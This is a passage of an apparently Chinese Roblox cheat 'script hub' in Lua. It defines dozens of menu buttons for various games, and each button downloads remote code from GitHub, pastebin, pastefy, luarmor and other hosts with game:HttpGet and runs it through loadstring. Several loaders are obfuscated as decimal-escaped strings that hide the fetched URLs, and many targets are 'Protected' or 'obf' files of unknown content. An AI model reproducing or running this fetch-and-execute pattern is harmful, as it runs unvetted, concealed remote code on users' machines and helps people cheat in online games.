    Url = "https://raw.githubusercontent.com/FengYu-X/_Hub_/refs/heads/X/FengYuHub"
}).Body)()
    end)
end)

Button(Tab6, "黄某脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaokong6/x1/refs/heads/main/黄某脚本加载器"))()
    end)
end)

Button(Tab6, "AQ脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SUNXIAOCHUAN886/AQ/refs/heads/main/AQ"))()
    end)
end)

Button(Tab6, "BS脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://gitlab.com/ajduoxcz/bs-center-of-the-black-hole/-/raw/main/BS%20Center%20of%20the%20black%20hole"))()
    end)
end)

Button(Tab6, "叶脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua"))()
    end)
end)

Button(Tab6, "皮脚本", function()
    pcall(function()
    getgenv().XiaoPi="皮脚本QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
    end)
end)

Button(Tab6, "落叶脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/123fa98/Code/refs/heads/main/Xi_Pro_Scipt.lua"))()
    end)
end)

Button(Tab6, "CDID脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-YESCRIPT-CDID.lua"))()
    end)
end)

Button(Tab6, "kanl脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dream77239/kanl/refs/heads/main/Kanl%E8%84%9A%E6%9C%AC"))()
    end)
end)

Button(Tab6, "LG脚本", function()
    pcall(function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
    end)
end)

Button(Tab6, "lSlS脚本", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/S-WTB/-/refs/heads/main/ISIS加载器'))()
    end)
end)

Button(Tab6, "MP中心", function()
    pcall(function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\77\80\48\48\78\47\77\80\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\75\105\110\103\46\108\117\97\34\41\41\40\41")()
    end)
end)

Button(Tab6, "NOL免费版", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Syndromehsh/BETA2/refs/heads/main/NOL"))()
    end)
end)

Button(Tab6, "Roblox脚本", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/HT-DJ/htdjsq/main/%E6%96%87%E4%BB%B6/Script/HT-DJ%20Roblox.lua'))()
    end)
end)

Button(Tab6, "SN中心", function()
    pcall(function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\120\105\97\110\105\110\103\49\53\49\47\83\78\72\85\66\47\109\97\105\110\47\83\78\104\117\98\46\108\117\97\34\41\41\40\41")()
    end)
end)

Button(Tab6, "Xi脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/123fa98/Code/refs/heads/main/Xi_Pro_Scipt.lua"))()
    end)
end)

Button(Tab6, "XC脚本中心", function()
    pcall(function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
    end)
end)

Button(Tab6, "XK脚本中心", function()
    pcall(function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\73\78\106\105\97\111\98\122\120\54\47\66\73\78\106\105\97\111\47\109\97\105\110\47\88\75\46\84\88\84\34\41\41\40\41\10")()
    end)
end)

Button(Tab6, "XP脚本（卡密：爱吃78的xp", function()
    pcall(function()
    loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\112\097\110\100\097\100\101\118\101\108\111\112\109\101\110\116\046\110\101\116\047\118\105\114\116\117\097\108\047\102\105\108\101\047\055\052\101\053\053\049\049\102\054\051\102\099\050\049\052\054"))()
    end)
end)

Button(Tab6, "X脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/maowang1/xx/refs/heads/main/Protected_8858329470146381.txt"))()
    end)
end)

Button(Tab6, "yba脚本", function()
    pcall(function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/NukeVsCity/hackscript123/main/gui")()
    end)
end)

Button(Tab6, "Z脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZiO9178/jb/refs/heads/main/ZiO.lua"))()
    end)
end)

Button(Tab6, "白沫脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaobai0744/-/refs/heads/main/%E7%99%BD%E6%B2%AB%E8%84%9A%E6%9C%AC%E6%BA%90(1).lua"))()
    end)
end)

Button(Tab6, "北约中心", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/USA868/114514-55-646-114514-88-61518-618-840-1018-634-10-4949-3457578401-615/main/Protected-36.lua"))()
    end)
end)

Button(Tab6, "辞瞄脚本.", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/SpinnyMemer/Gravity-Hub/refs/heads/main/ArsenalMobile.lua'))()
    end)
end)

Button(Tab6, "cw脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1d4db6a1b04aaeccf046f7c63fbad31a.lua"))()
    end)
end)

Button(Tab6, "海战脚本", function()
    pcall(function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/OWOWOWWOW/HTT/main/HT.lua")()
    end)
end)

Button(Tab6, "达脚本云更新V5", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/133ufudhdu/XGJKWQU/main/XGQJKWQU"))()
    end)
end)

Button(Tab6, "导管脚本", function()
    pcall(function()
     loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
    end)
end)

Button(Tab6, "帝脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zilinskaslandon/-/refs/heads/main/lllllllll.lua"))()
    end)
end)

Button(Tab6, "旧黑白脚本", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/0a572fcc356231593d062f45acedbcdad42c6fd8/%E9%BB%91%E7%99%BD%E8%84%9A%E6%9C%AC'))()
    end)
end)

Button(Tab6, "冬凌中心", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoLingUwU/Xiao-Ling-ai-nicai/main/%E5%B0%8F%E5%87%8C%E4%B8%AD%E5%BF%83UwU.XiaoLing.AEX.Lua"))("冬凌你好")
    end)
end)

Button(Tab6, "鹤脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/qazpin66/-/refs/heads/main/%E9%B9%A41.5.lua"))()
    end)
end)

Button(Tab6, "皇脚本.", function()
    pcall(function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\100\84\55\99\65\82\84"))()
    end)
end)

Button(Tab6, "黄脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/realguiwow/skidskidskid/refs/heads/main/Protected_1656297221700322.lua"))()
    end)
end)

Button(Tab6, "挽脚本1.2.2", function()
    pcall(function()
    -- 饿死也不圈钱！！
-- 支持通用全家桶 力量 极速 战争大亨 自然灾害
-- 全复制都可以
loadstring(game:HttpGet('https://raw.githubusercontent.com/XxwanhexxX/UN/refs/heads/main/lua'))()
    end)
end)

Button(Tab6, "锻造脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a221309d4a35f389a793462a7fe607da.lua"))()
    end)
end)

Button(Tab6, "SX HUB V2", function()
    pcall(function()
    --[超强脚本 已经更新至V2 脚本加载大约15秒左右 请耐心等待 QQ主群566257944]
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/87a8a4f4c2d2ef535ccd1bdb949218fe.lua"))()
    end)
end)

-- FE (Tab7)
Button(Tab7, "FE coolkid-酷小孩", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hyperionhax/c00lgui/refs/heads/main/CoolGui.lua"))()
    end)
end)

Button(Tab7, "FE 爬行", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt'))()
    end)
end)

Button(Tab7, "FE R15动画", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FengYu-3/general/refs/heads/main/FE_R15.lua"))()
    end)
end)

Button(Tab7, "FE地精.", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rTvXTs8F16D8D2oiLxZ62E1E9jT1we312yUyJr2h72Vwqr32l37rirU1S89hqRV7.lua.txt"))()
    end)
end)

Button(Tab7, "FE大运", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6"))()
    end)
end)

Button(Tab7, "FE方块", function()
    pcall(function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\103\97\47\50\66\120\90\69\83\109\106\47\114\97\119\39\41\44\116\114\117\101\41\41\40\41\10")()
    end)
end)

Button(Tab7, "FE狒狒", function()
    pcall(function()
    loadstring(game:HttpGet(('https://pastefy.ga/osEThPw1/raw'),true))()
    end)
end)

Button(Tab7, "FE假延迟", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/fakeLAGRENZXW.txt"))()
    end)
end)

Button(Tab7, "FE燃尽脚本.", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DROID-cell-sys/ANTI-UTTP-SCRIPTT/refs/heads/main/EGOR%20SCRIPT%20BY%20ANTI-UTTP"))()
    end)
end)

Button(Tab7, "FE杀手", function()
    pcall(function()
    loadstring(game:HttpGet(('https://pastefy.ga/d7sogwNS/raw'),true))()
    end)
end)

Button(Tab7, "FE舞蹈（超级多）", function()
    pcall(function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Free-emote/refs/heads/main/Delta%20mad%20stuffs"))()
    end)
end)

Button(Tab7, "FE变大变小（有些服务器用不了）", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tfcygvunbind/Apple/492dc6092ca66e8de1ed30a7ce8880c12f05c1e6/%EF%BC%9F%EF%BC%81%EF%BC%9F%EF%BC%81"))()
    end)
end)

Button(Tab7, "FE滚球", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KaterHub-Inc/scripts/refs/heads/main/unofficial-Projects/FEHamsterBall.lua"))()
    end)
end)

Button(Tab7, "FE拥抱", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Front%20and%20Back%20Hug%20Tool"))()
    end)
end)

Button(Tab7, "FEac6音乐播放器（有些服务器用不了）", function()
    pcall(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
    end)
end)

Button(Tab7, "FE无头断腿（有些服务器用不了）", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cwmen755-ai/abc/refs/heads/main/Korblox%20And%20Headless"))()
    end)
end)

-- DOORS功能 (Tab8)
Button(Tab8, "门", function()
    pcall(function()
        loadstring(game:HttpGet("https://github.com/DocYogurt/free/raw/main/long"))()
    end)
end)

Button(Tab8, "Poop doors", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mstudio45/poopdoors_edited/main/poopdoors_edited.lua"))()
    end)
end)

Button(Tab8, "穿墙(无拉回)", function()
    pcall(function()
        loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
    end)
end)

Button(Tab8, "变身(阿巴怪提供)", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))()
    end)
end)

Button(Tab8, "剪刀", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/shears_done.lua"))()
    end)
end)

Button(Tab8, "MS", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()
    end)
end)

Button(Tab8, "十字架", function()
    pcall(function()
        loadstring(game:HttpGet('https://gist.githubusercontent.com/C00LBOZO/0c78ad8c74ca26324c87ede16ce8b387/raw/c0887ac0d24fde80bea11ab1a6a696ec296af272/Crucifix'))()
    end)
end)

Button(Tab8, "吸铁石", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/MagnetByNerd.lua"))()
    end)
end)

Button(Tab8, "激光枪", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Laser%20Gun"))()
    end)
end)

Button(Tab8, "能量罐（清岩提供）", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/nengliangtiao"))()
    end)
end)

Button(Tab8, "紫色手电筒（在电梯购买东西的时候使用）", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Purple%20Flashlight"))()
    end)
end)

Button(Tab8, "刷怪菜单", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shuaguai"))()
    end)
end)

Button(Tab8, "DOORS变身脚本", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))()
    end)
end)

Button(Tab8, "耶稣十字架", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi2"))()
    end)
end)

Button(Tab8, "紫光十字架", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi3"))()
    end)
end)

Button(Tab8, "万圣节十字架", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi4"))()
    end)
end)

Button(Tab8, "普通十字架", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizizhen"))()
    end)
end)

-- rooms&doors (Tab9)
Button(Tab9, "rooms&doors", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/Rooms%20%26%20Doors"))()
    end)
end)

Button(Tab9, "rooms同人服务器", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/Rooms"))()
    end)
end)

-- 压力,doors (Tab10)
Button(Tab10, "最强doors & 压力", function()
    pcall(function()
        loadstring(game:HttpGet("https://github.com/Drop56796/CreepyEyeHub/blob/main/obfuscate.lua?raw=true"))()
    end)
end)

-- 动感星期五 (Tab11)
Button(Tab11, "动感星期五1", function()
    pcall(function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Funky-Friday-Fire-Hub-18850"))()
    end)
end)

Button(Tab11, "动感星期五2", function()
    pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Skedzz/ScriptHub/main/Loader"))()
    end)
end)

Button(Tab11, "动感星期五3", function()
    pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()   
    end)
end)

Button(Tab11, "动感星期五4", function()
    pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/WarTycoon", true))() 
    end)
end)

-- 压力 (Tab12)
Button(Tab12, "NB", function()
    pcall(function()
        loadstring(game:HttpGet('https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure'))()
    end)
end)

Button(Tab12, "压力！！！", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ohiojjj/78/main/.github/workflows/Protected_5509067665689579.lua'))()
    end)
end)

Button(Tab12, "压力脚本", function()
    pcall(function()
    getgenv().lishichuan="1001390385" loadstring(game:HttpGet("https://pastebin.com/raw/iZuasZCc"))()
    end)
end)

-- 成为乞丐 (Tab13)
Button(Tab13, "刷钱", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/main/无！'))()
    end)
end)

Button(Tab13, "国内汉化", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/NEGA.lua"))()
    end)
end)


-- 磁铁模拟器 (Tab14)
Button(Tab14, "自动收集硬币", function()
    pcall(function()
         loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/b/Mua", true))()
    end)
end)

-- 建造一架飞机 (Tab15）
Button(Tab15, "建造一架飞机脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHubScript/_/refs/heads/main/b.lua"))()
    end)
end)

-- 勘探中 (Tab16)
Button(Tab16, "勘探中脚本1", function()
    pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/Prospecting", true))()
    end)
end)

-- 法宝模拟器 (Tab17)
Button(Tab17, "法宝模拟器1（会覆盖）", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeRobloxScripts/anime-fighting/main/simulator"))()
    end)
end)

-- 在披萨店工作 (Tab18)
Button(Tab18, "在披萨店工作", function()
    pcall(function()
    loadstring(game:HttpGet("https://github.com/CloudX-ScriptsWane/ScriptsDache/raw/main/披萨店工作.luau", true))()
    end)
end)

-- 战斗勇士 (Tab19)
Button(Tab19, "老外杀人脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
    end)
end)

-- 一次尘土的旅行 (Tab20)
Button(Tab20, "老外牛逼脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/a-dusty-trip-FREE-CAR-Gui-14352"))()
    end)
end)

-- 破坏者谜团2 (Tab21)
Button(Tab21, "破坏者谜团2", function()
    pcall(function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script"),true))()  
    end)
end)

Button(Tab21, "透视身份", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
    end)
end)

-- 模仿者 (Tab22)
Button(Tab22, "模仿者1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/obfloadstringmainmimic/main/README.md", true))()
    end)
end)

-- 火箭发射模拟器 (Tab23)
Button(Tab23, "火箭发射模拟器1", function()
    pcall(function()
    loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/9245/%E7%8C%AB%E9%80%9A%E7%94%A8.txt?sign=hrWROZdVfK2mtJcIFa3Tvbl-TojP1C86_Zd3q03qttc%3D%3A0"))()
        end)
end)

-- 只因剑 (Tab24)
Button(Tab24, "只因剑1", function()
    pcall(function()
     loadstring(game:HttpGet(('https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.lua'),true))()
        end)
end)

-- 森林里的99夜 (Tab25)
Button(Tab25, "二狗子脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/shenqin/refs/heads/main/99day.lua"))()
    end)
end)

Button(Tab25, "虚空脚本Kenny汉化", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/99%E5%A4%9C%E8%99%9A%E7%A9%BA.txt"))()
    end)
end)

Button(Tab25, "自动刷钻石3.0", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rezexis/Main-Lua/refs/heads/main/Loader.lua"))()
    end)
end)

Button(Tab25, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
    end)
end)

Button(Tab25, "脚本2", function()
    pcall(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/99-Nights-in-the-Forest-99-NITF-KEYLESS-SCRIPT-48729"))()
    end)
end)

Button(Tab25, "脚本三", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/森林中的99夜.lua"))()
    end)
end)

Button(Tab25, "汉化脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/atnew2025/99dayinLEIDIAN/refs/heads/main/99夜汉化小本.txt"))()
    end)
end)

Button(Tab25, "汉化脚本二", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/358545698555/roblox-/refs/heads/main/%E5%8F%AF%E6%9D%80%E9%98%9F%E5%8F%8B99%E5%A4%9C"))()
    end)
end)

-- 旗帜战争 (Tab26)
Button(Tab26, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Flag%20Wars.txt'))()  
    end)
end)

-- 逃出建筑 (Tab27)
Button(Tab27, "脚本一", function()
    pcall(function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
    end)
end)

-- 打墙模拟器 (Tab28)
Button(Tab28, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JunBloxYTPlayz/SORIX-Hub/main/Punch%20Wall%20Simulator"))();
    end)
end)

-- 生存巨人 (Tab29)
Button(Tab29, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RiseValco/scripts/main/GiantSurvival.lua"))()
    end)
end)

-- 健身房之星模拟器 (Tab30)
Button(Tab30, "脚本1", function()
    pcall(function()
        loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/v/Mua", true))()
    end)
end)

-- 死铁轨 (Tab31)
Button(Tab31, "刷债券1", function()
    pcall(function()
    --[[by 退休不退休]]QUN = "160369111"TX = "退休脚本"script = "死铁轨免费刷债券"BY = "退休"loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/%E5%88%B7%E5%80%BA%E5%88%B8"))()
    end)
end)

Button(Tab31, "刷债券2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
    end)
end)

Button(Tab31, "找闪电马脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wehjf/famineringta.github.io/refs/heads/main/horseringta.lua"))()
    end)
end)

Button(Tab31, "找岩浆马脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fjruie/Warhorse.github.io/refs/heads/main/ringta.lua"))()
    end)
end)

Button(Tab31, "攻速脚本", function()
    pcall(function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/HeadHarse/DeadRails/refs/heads/main/V5OPSWING"))()   
    end)
end)

Button(Tab31, "传送脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/badass1ia/Merciful/refs/heads/main/Absurdity111"))()
    end)
end)

Button(Tab31, "红叶脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://getnative.cc/script/loader"))()
    end)
end)

Button(Tab31, "焊接脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HeadHarse/Dusty/refs/heads/main/WeldObject"))()
    end)
end)

Button(Tab31, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet('https://pastefy.app/7vZN3EwV/raw'))()
    end)
end)

Button(Tab31, "脚本2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownlodfc/Zephyr/refs/heads/main/DeadRails/Main"))()
    end)
end)

-- 墨水游戏 (Tab32)
Button(Tab32, "oP脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScripterVaz/InkGameAzure/main/Protected_7974105512464815.lua.txt"))()
    end)
end)

Button(Tab32, "汉化脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XOTRXONY/INKGAME/main/INKGAMEE.lua", true))()
    end)
end)

Button(Tab32, "XA脚本", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/hngamingroblox/scripts/main/strongman%20simulator'))()
    end)
end)

-- 自然灾害模拟器 (Tab33)
Button(Tab33, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
    end)
end)

Button(Tab33, "万磁王", function()
    pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/CMnEfnz8"))()
    end)
end)

Button(Tab33, "黑洞v6", function()
    pcall(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-ring-Parts-V6-28581"))()
    end)
end)

Button(Tab33, "黑洞", function()
    pcall(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-BLACK-HOLE-30646"))()
    end)
end)


Button(Tab33, "没有坠落伤害", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local ServicioRun = game:GetService("RunService")
local Latido = ServicioRun.Heartbeat
local Render = ServicioRun.RenderStepped
local Jugador = game.Players.LocalPlayer
local VelocidadNula = Vector3.zero
local function EvitarCaida(personaje)
    local Raiz = personaje:WaitForChild("HumanoidRootPart")
    local conexion
    conexion = Latido:Connect(function()
        if not Raiz.Parent then
            conexion:Disconnect()
            return
        end
        local velocidadAnt = Raiz.AssemblyLinearVelocity
        Raiz.AssemblyLinearVelocity = VelocidadNula
        Render:Wait()
        Raiz.AssemblyLinearVelocity = velocidadAnt
    end)
end
EvitarCaida(Jugador.Character or Jugador.CharacterAdded:Wait())
Jugador.CharacterAdded:Connect(EvitarCaida)

--sexo
    end)
end)

-- 穷小子打工记 (Tab34)
Button(Tab34, "神青脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/QQ-9-2-8-9-50173/refs/heads/main/newsqnb.lua"))()
    end)
end)

-- 最后的黎明 (Tab35)
Button(Tab35, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\108\121\98\121\80\50\103\54\47\114\97\119"))()
    end)
end)

-- 索纳里亚世界 (Tab36)
Button(Tab36, "索纳里亚世界1", function()
    pcall(function()
    _G.Enabled = true
-- If you want to turn it off, just change true to false and execute again!
loadstring(game:HttpGet("https://pastebin.com/raw/CPPehxn8", true))()
    end)
end)

Button(Tab36, "索纳里亚世界2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mangnex/Lunar-Hub/refs/heads/main/FreeLoader/Mua"))()
    end)
end)

Button(Tab36, "索纳里亚世界3", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Looser3itx/Hmmmmmmmmmmmmmmmmmmmmmmmmmmmm/main/loader.lua"))()
    end)
end)

-- 河北唐县 (Tab37)
Button(Tab37, "皮脚本-河北唐县", function()
    pcall(function()
